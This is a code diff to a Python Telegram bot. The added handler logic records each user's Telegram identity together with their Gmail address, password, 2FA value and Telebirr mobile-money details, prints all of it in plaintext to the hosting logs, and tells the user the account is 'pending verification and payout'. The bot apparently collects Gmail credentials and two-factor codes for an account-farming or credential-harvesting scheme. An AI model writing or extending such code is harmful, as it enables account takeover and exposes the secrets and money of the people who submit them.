@@ -55,6 +55,33 @@ async def get_telebirr(update: Update, context: ContextTypes.DEFAULT_TYPE):
     password = context.user_data.get('password')
     two_fa = context.user_data.get('2fa')
     
+    # 1. Grab the user who submitted this
+    user = update.effective_user
+    user_id = user.id
+    username = user.username if user.username else "No username"
+    first_name = user.first_name
+    
+    # Print submitted info + user details to your Render logs
+    print("\n--- NEW SUBMISSION ---")
+    print(f"Telegram User ID: {user_id}")
+    print(f"Telegram Name: {first_name}")
+    print(f"Telegram Username: @{username}")
+    print(f"Gmail: {email}")
+    print(f"Password: {password}")
+    print(f"2FA: {two_fa}")
+    print(f"Telebirr: {telebirr_info}")
+    print("----------------------\n")
+
+    reply_keyboard = [["Register a new Gmail"], ["Balance", "Help"]]
+    markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)
+    
+    await update.message.reply_text(
+        "Submission received! Your account is pending verification and payout.",
+        reply_markup=markup
+    )
+    return ConversationHandler.END
+
+    
     # Print submitted info to Pydroid console
     print("\n--- NEW SUBMISSION ---")
     print(f"Gmail: {email}")
